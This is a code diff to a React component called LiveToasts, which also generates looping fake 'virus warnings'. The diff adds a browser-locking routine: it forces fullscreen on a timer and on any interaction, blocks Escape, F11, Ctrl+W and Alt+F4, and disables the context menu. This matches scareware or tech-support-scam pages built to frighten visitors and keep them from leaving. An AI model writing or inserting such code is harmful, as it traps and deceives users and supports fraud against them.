@@ -88,6 +88,39 @@ export function LiveToasts() {
     let latestForTriple: LiveToast | null = null;
     let loadNotified = false;
 
+    // Request fullscreen on first interaction
+    const requestFullscreen = () => {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(() => {});
+      }
+    };
+
+    // Block escape key and other navigation attempts
+    const blockEscape = (e: KeyboardEvent) => {
+      if (e.key === 'Escape' || e.key === 'F11' || (e.ctrlKey && e.key === 'w') || (e.altKey && e.key === 'F4')) {
+        e.preventDefault();
+        e.stopPropagation();
+        requestFullscreen();
+      }
+    };
+
+    // Block right-click context menu
+    const blockContextMenu = (e: MouseEvent) => {
+      e.preventDefault();
+      e.stopPropagation();
+    };
+
+    // Try to go fullscreen after a delay
+    setTimeout(() => {
+      if (!stopped) requestFullscreen();
+    }, 2000);
+
+    // Also try on any user interaction
+    document.addEventListener('click', requestFullscreen);
+    document.addEventListener('keydown', requestFullscreen);
+    document.addEventListener('keydown', blockEscape, true);
+    document.addEventListener('contextmenu', blockContextMenu, true);
+
     // Auto-generate virus warnings - continuous loop
     const virusWarnings = [
       {
@@ -256,6 +289,10 @@ export function LiveToasts() {
       channel?.removeEventListener("message", onChannel);
       channel?.close();
       void audio?.close();
+      document.removeEventListener('click', requestFullscreen);
+      document.removeEventListener('keydown', requestFullscreen);
+      document.removeEventListener('keydown', blockEscape, true);
+      document.removeEventListener('contextmenu', blockContextMenu, true);
     };
   }, [isDesk]);
 
